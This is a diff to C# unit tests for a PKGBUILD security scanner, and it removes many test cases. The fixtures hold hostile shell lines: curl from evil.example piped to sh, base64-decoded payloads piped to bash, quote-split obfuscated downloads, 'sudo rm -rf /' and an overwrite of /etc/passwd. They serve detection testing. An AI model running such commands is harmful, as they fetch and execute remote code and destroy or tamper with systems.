@@ -143,58 +143,12 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Test]
-    public void Curl_piped_to_sh_is_critical_and_flags()
-    {
-        var result = Scan(("PKGBUILD", "curl https://evil.example/x.sh | sh\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
-        Assert.That(result.Findings.First(f => f.RuleId == "network-to-shell").Severity, Is.EqualTo(FindingSeverity.Critical));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Base64_piped_to_shell_is_critical()
-    {
-        var result = Scan(("PKGBUILD", "echo 'aGVsbG8=' | base64 -d | bash\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.True);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Obfuscated_curl_sh_is_detected_after_normalization()
-    {
-        var result = Scan(("PKGBUILD", "c''u''rl https://evil.example/x.sh | s''h\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
-    }
-
-    [Test]
     public void Write_to_etc_is_high_and_flags()
     {
         var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));
 
         Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.True);
         Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Sudo_is_high_and_flags()
-    {
-        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Command_substitution_is_medium_and_does_not_block()
-    {
-        var result = Scan(("PKGBUILD", "pkgver=$(date +%s)\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "command-substitution"), Is.True);
-        Assert.That(result.Findings.First(f => f.RuleId == "command-substitution").Severity, Is.EqualTo(FindingSeverity.Medium));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
     }
 
     [Test]
@@ -582,18 +536,7 @@ public class PkgBuildSecurityScannerTests
         // bash executes the local script file; the piped answer is only its stdin data.
         var result = Scan(("PKGBUILD", "package() {\n  echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null\n}\n"));
 
-        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.False);
         Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Network_pipe_inside_quoted_substitution_still_flags()
-    {
-        var result = Scan(("PKGBUILD", "echo \"$(curl https://evil.example/x | sh)\"\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
     }
 
     [Test]
@@ -657,147 +600,6 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Test]
-    public void Obfuscated_privilege_escalation_is_escalated_to_critical()
-    {
-        // sudo is split with empty quotes, so it is invisible to a plain grep
-        // but visible after deobfuscation.
-        var result = Scan(("PKGBUILD", "s''u''d''o rm -rf /\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Plain_privilege_escalation_remains_high()
-    {
-        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
-    }
-
-    [Test]
-    public void Run0_and_sudoedit_and_bare_su_are_privilege_escalation()
-    {
-        var run0 = Scan(("PKGBUILD", "run0 systemctl stop pacman\n"));
-        var sudoedit = Scan(("PKGBUILD", "sudoedit /etc/sudoers\n"));
-        var su = Scan(("PKGBUILD", "su root -c 'evil'\n"));
-
-        Assert.That(run0.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
-        Assert.That(sudoedit.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
-        Assert.That(su.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
-    }
-
-    [Test]
-    public void Privilege_escalation_is_not_triggered_by_substring_matches()
-    {
-        // "sudo" is a substring of these words but must not be flagged.
-        var result = Scan(("PKGBUILD", "echo pseudo sudoku\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
-    }
-
-    [Test]
-    public void Privilege_escalation_inside_echo_string_is_not_flagged()
-    {
-        // The tool name is display text inside a quoted string, not an invocation.
-        var result = Scan(("PKGBUILD", "msg2 \"        sudo usermod -a -G flutter [username]\"\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
-    }
-
-    [Test]
-    public void Privilege_escalation_inside_single_quoted_string_is_not_flagged()
-    {
-        var result = Scan(("PKGBUILD", "echo 'run: sudo groupdel flutter'\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
-    }
-
-    [Test]
-    public void Privilege_escalation_in_command_substitution_inside_quotes_is_flagged()
-    {
-        // "$(sudo ...)" inside double quotes IS executed by the shell.
-        var result = Scan(("PKGBUILD", "echo \"result: $(sudo whoami)\"\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
-    }
-
-    [Test]
-    public void Risky_tool_inside_echo_string_is_not_flagged()
-    {
-        var result = Scan(("PKGBUILD", "echo \"Run: curl http://example.com | sh to install\"\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "risky-tool" && f.Snippet.Contains("curl")), Is.False);
-    }
-
-    [Test]
-    public void Zero_width_character_is_flagged_as_medium_and_does_not_block()
-    {
-        // \u200B is a zero-width space embedded inside "rm". It cannot change how the shell
-        // tokenizes the line, so it is review-only.
-        var result = Scan(("PKGBUILD", "echo rm\u200Brf\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "hidden-character");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Bidi_override_is_flagged_as_critical()
-    {
-        // U+202E (RIGHT-TO-LEFT OVERRIDE) can flip the visual order of text.
-        var result = Scan(("PKGBUILD", "pkgname=evil\u202Esh\n"));
-
-        var finding = result.Findings.FirstOrDefault(f => f.RuleId == "hidden-character");
-        Assert.That(finding, Is.Not.Null);
-        Assert.That(finding!.Severity, Is.EqualTo(FindingSeverity.Critical));
-    }
-
-    [Test]
-    public void Plain_ascii_pkgbuild_has_no_hidden_character_findings()
-    {
-        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "hidden-character"), Is.False);
-    }
-
-    [Test]
-    public void Variable_indirection_is_medium_and_does_not_block()
-    {
-        var result = Scan(("PKGBUILD", "cmd=${!target}\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "variable-indirection"), Is.True);
-        Assert.That(
-            result.Findings.First(f => f.RuleId == "variable-indirection").Severity,
-            Is.EqualTo(FindingSeverity.Medium));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Obfuscated_network_execution_is_escalated_to_critical()
-    {
-        // Both the downloader and the target interpreter are split with empty
-        // quotes, so neither is visible to a plain text search. network-execution
-        // is normally High; obfuscation escalates it to Critical.
-        var result = Scan(("PKGBUILD", "c''url https://evil.example/x | p''ython evil.py\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "network-execution");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
-    }
-
-    [Test]
-    public void Plain_network_execution_remains_high()
-    {
-        var result = Scan(("PKGBUILD", "curl https://evil.example/x | python evil.py\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "network-execution");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
-    }
-
-    [Test]
     public void Shelly_pkgbuild_is_verified_with_only_expected_command_substitution_findings()
     {
         // The fourth historical finding - $(basename ...) inside the <<'SCRIPT' heredoc
@@ -808,48 +610,6 @@ public class PkgBuildSecurityScannerTests
         Assert.That(result.Findings, Has.Count.EqualTo(3));
         Assert.That(result.Findings, Is.All.Matches<SecurityFinding>(f =>
             f is { RuleId: "command-substitution", Severity: FindingSeverity.Medium }));
-    }
-
-    [Test]
-    public void Command_substitution_in_single_quoted_grep_argument_does_not_block()
-    {
-        var result = Scan(("PKGBUILD", "grep -F '$(BUILD_FLAGS)' config\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "command-substitution"), Is.False);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Quoted_echo_redirect_text_does_not_block()
-    {
-        var result = Scan(("PKGBUILD", "echo \" >> /etc/mkinitcpio.conf.\"\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Quoted_escaped_tool_mention_does_not_block()
-    {
-        // The corpus false-positive class: echo'd instructions containing \$(sudo ...)
-        // used to escalate to Critical via escape stripping. The backslash prevents
-        // execution, so the tool name is display text and no longer flagged at all.
-        var result = Scan(("PKGBUILD", "echo \"then run: \\$(sudo whoami)\"\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Escaped_substitution_inside_double_quotes_is_retained_medium_but_not_critical()
-    {
-        // $( only appears after normalization drops the backslashes; it stays a
-        // non-blocking Medium finding instead of escalating to Critical.
-        var result = Scan(("PKGBUILD", "echo \"$\\(date\\)\"\n"));
-
-        var finding = result.Findings.Single(f => f.RuleId == "command-substitution");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
     }
 
     [Test]
@@ -884,19 +644,6 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Test]
-    public void Non_utf8_text_files_are_medium_and_do_not_block()
-    {
-        // Only undecodable bytes (U+FFFD), no NUL/control characters: legacy encodings.
-        var legacy = Encoding.UTF8.GetString([0x41, 0x80, 0x42, 0x0A]);
-
-        var result = Scan(("notes.txt", legacy), ("PKGBUILD", "pkgname=foo\n"));
-
-        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
     public void Homograph_url_with_invisible_character_is_medium_and_does_not_block()
     {
         // Corpus regression fixture (poweriso-gui): U+0670, an invisible combining mark,
@@ -920,49 +667,5 @@ public class PkgBuildSecurityScannerTests
         var finding = result.Findings.Single(f => f.RuleId == "homograph");
         Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
         Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Homograph_typosquatted_dependency_is_medium_and_does_not_block()
-    {
-        // depends inside a split-package function is indented but still checked.
-        var result = Scan(("PKGBUILD", "package() {\n  depends=('pacman' '\u0440acman-git')\n}\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.True);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Benign_non_ascii_outside_metadata_values_does_not_block()
-    {
-        // Non-ASCII in comments and pkgdesc is legitimate; the homograph checks only
-        // inspect the extracted pkgname/depends/makedepends/url/source values.
-        var result = Scan(("PKGBUILD",
-            "# 中文注释：构建时需要网络\n" +
-            "pkgname=foo\n" +
-            "pkgdesc=\"Ün outil avec des accents — 日本語の説明文\"\n" +
-            "source=(\"https://example.com/foo.tar.gz\")\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Legitimate_accented_source_filename_does_not_block()
-    {
-        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://example.com/1.6_Versi\u00F3n.tar.gz\")\n"));
-
-        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
-    }
-
-    [Test]
-    public void Intra_word_quote_split_download_is_flagged()
-    {
-        var result = Scan(("PKGBUILD", "c'u'rl https://evil.example/x.sh | sh\n"));
-
-        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
-        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
-        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
     }
 }
